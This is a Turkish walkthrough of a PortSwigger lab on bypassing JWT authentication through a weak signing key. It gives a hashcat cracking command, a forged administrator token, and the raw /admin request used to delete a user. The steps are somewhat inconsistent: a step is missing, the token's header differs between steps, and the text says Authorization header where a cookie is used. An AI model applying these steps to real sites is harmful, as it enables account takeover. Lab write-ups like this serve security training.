# LAB 3 (JWT authentication bypass via weak signing key)

Elbette, bu **"JWT authentication bypass via weak signing key"** laboratuvarını birlikte adım adım çözelim. Burp Suite ve Hashcat kullanacağız. Başlıyoruz:

---

##  **Adım 1: JWT’yi yakala**

1. **Burp Suite’i başlat**, tarayıcını proxy’ye yönlendir.
2. Kullanıcı hesabına giriş yap:

   * **Kullanıcı adı**: `wiener`
   * **Şifre**: `peter`
3. Giriş yaptıktan sonra **"My Account"** sayfasına git. Burada JWT token gönderilir.
4. Bu isteği **Burp Repeater**’a gönder (sağ tık → "Send to Repeater").
5. Header kısmındaki JWT token'ı kopyala (Set-Cookie:) .

```

HTTP/2 302 Found
Location: /my-account?id=wiener
Set-Cookie: session=eyJraWQiOiI5OGYxYzk1Ni1lNDliLTRhMWEtYmU2My1iNmUwOTdjMmM2NDAiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0Nzg0Nzk2MCwic3ViIjoid2llbmVyIn0.9M1g1UNhloUtd63Kar\_-\_i-YTA0w4T72wGHNf1jdB48;
Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0

```

---

## **Adım 2: JWT’yi brute-force ile kır**

JWT şu formatta olur:

```

header.payload.signature

````

Hashcat için `JWT` token'ını aşağıdaki gibi kullanacağız:

### Gerekli komut (Linux için örnek):

```bash
hashcat -a 0 -m 16500 jwt_token.txt jwt.secrets.list --show --force
````

 Eğer `jwt.secrets.list` yoksa, [PortSwigger’ın wordlist](https://github.com/PortSwigger/jwt-secrets/blob/main/jwt.secrets.list) dosyasını kullanabilirsin.

Örnek:

### veya

```bash
python3 jwt_bruteforce.py
```

**Sonuç**:
Hashcat doğru sırayı bulur, örnek çıktı:

```
eyJhbGciOi...:secret1
```

---

## **Adım 3: Sahte JWT oluştur**

eyJraWQiOiI5OGYxYzk1Ni1lNDliLTRhMWEtYmU2My1iNmUwOTdjMmM2NDAiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0Nzg0Nzk2MCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.o8z32hhLhz6NEIMnvF-9mQYbUnbom1zxU7KCBVwLzVk

![lab3jwt.png](lab3jwt.png)

---

## **Adım 5: Admin paneline eriş**

1. Burp Repeater’da yolu `/admin` olarak değiştir.
2. Authorization header’ındaki token’ı yeni oluşturduğun JWT ile değiştir.
3. İsteği gönder → Admin paneli gelmeli.

```
GET /admin HTTP/2
Host: 0a1200ac033b707c82122eb20096004f.web-security-academy.net
Cookie: session=eyJraWQiOiI5OGYxYzk1NiJkLTQ5Yi00YTFlLWJlNjMtYjZlMDk3YzJjNjQwIiwiYWxnIjoiSldUIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0Nzg0Nzk2MCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.o8z32hhLhz6NEIMnvF-9mQYbUnbom1zxU7KCBVwLzVk
Sec-Ch-Ua: "Not.A/Brand";v="99", "Chromium";v="136"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a1200ac033b707c82122eb20096004f.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

```

---

## **Adım 6: carlos’u sil**

```
/admin/delete?username=carlos
```

2. Bu URL'ye yeni bir `GET` isteği gönder.

---
